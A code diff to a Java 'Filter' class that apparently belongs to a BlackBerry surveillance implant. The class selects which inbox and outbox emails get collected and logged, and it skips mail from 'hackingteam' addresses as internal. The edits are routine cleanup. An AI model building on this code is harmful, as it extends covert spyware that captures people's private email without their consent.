@@ -29,7 +29,7 @@ import blackberry.utils.WChar;
  */
 class Filter {
     // #debug
-    static Debug debug = new Debug("Filter", DebugLevel.NOTIFY);
+    static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);
 
     public static final int TYPE_REALTIME = 0;
     public static final int TYPE_COLLECT = 1;
@@ -46,7 +46,7 @@ class Filter {
     static final int FILTERED_SIZE = -5;
     static final int FILTERED_MESSAGE_ADDED = -6;
     static final int FILTERED_FOUND = -7;
-    static final int FILDERED_INTERNAL = -8;
+    static final int FILTERED_INTERNAL = -8;
     static final int FILTERED_OK = 0;
 
     String[] folderNames = new String[] { "Inbox", "Outbox" };
@@ -186,8 +186,8 @@ class Filter {
      * @throws MessagingException
      *             the messaging exception
      */
-    public int filterMessage(final Message message, final long lastcheck
-            ) throws MessagingException {
+    public int filterMessage(final Message message, final long lastcheck)
+            throws MessagingException {
 
         //#ifdef DBC
         Check.requires(message != null, "filterMessage: message != null");
@@ -195,29 +195,29 @@ class Filter {
 
         long dataArrivo;
         // #mdebug
-        debug.trace("invio dell'email " + message.getSentDate() + " long: "
+        /*debug.trace("invio dell'email " + message.getSentDate() + " long: "
                 + message.getSentDate().getTime());
         debug.trace("arrivo dell'email " + message.getReceivedDate()
                 + " long: " + message.getReceivedDate().getTime());
         debug.trace("filtro FROM enabled:" + doFilterFromDate + " : "
                 + new Date(fromDate));
         debug.trace("filtro TO enabled:" + doFilterToDate + " : "
-                + new Date(toDate));
+                + new Date(toDate));*/
 
         Address[] from = message.getRecipients(Message.RecipientType.FROM);
+        //#ifdef DBC
+        Check.asserts(from != null, "filterMessage: from!=null");
+        //#endif
         for (int i = 0; i < from.length; i++) {
-            if (from[i].getAddr().indexOf("hackingteam") > -1) {
+            String addr = from[i].getAddr();
+            if (addr != null && addr.indexOf("hackingteam") > -1) {
                 debug.info("INTERNAL Address, skip it");
-                return FILDERED_INTERNAL;
+                return FILTERED_INTERNAL;
             }
-        }
-        if (message.getSubject().indexOf("DEBUG") > -1) {
-            debug.info("DEBUG subject, use it");
-            return FILTERED_OK;
-        }
+        }                      
         // #enddebug
-
-        Folder folder = message.getFolder();      
+       
+        Folder folder = message.getFolder();
 
         boolean found = false;
         if (folder != null) {
@@ -231,19 +231,18 @@ class Filter {
                 }
             }
         }
-
+        
         if (!found) {
             //#debug info
             debug.info("filterMessage: FILTERED_FOUND: " + folder.getName());
             return FILTERED_FOUND;
         }
-
         // Se c'e' un filtro sulla data
         // entro
 
         if (!enabled) {
             // #debug info
-            debug.info("Disabled");
+            // debug.info("Disabled");
             // TODO: attenzione, da riabilitare, per qualche ragione e' sempre disabled
             //return FILTERED_DISABLED;
         }
@@ -255,13 +254,14 @@ class Filter {
                     + lastcheck);
             return FILTERED_LASTCHECK;
         }
-
+   
         // se c'e' il filtro from e non viene rispettato escludi la mail
         if (doFilterFromDate == true && dataArrivo < fromDate) {
             // #debug info
             debug.info("doFilterFromDate");
             return FILTERED_FROM;
-        }        
+        }
+              
         // Se c'e' anche il filtro della data di fine e non viene rispettato
         // escludi la mail
         if (doFilterToDate == true && dataArrivo > toDate) {
@@ -269,7 +269,7 @@ class Filter {
             debug.info("doFilterToDate");
             return FILTERED_TO;
         }
-
+       
         final int trimAt = 0;
         if ((maxMessageSizeToLog > 0)
                 && (message.getSize() > maxMessageSizeToLog)) {
@@ -277,7 +277,7 @@ class Filter {
             debug.info("maxMessageSizeToLog");
             return FILTERED_SIZE;
         }
-
+        
         return FILTERED_OK;
     }
 
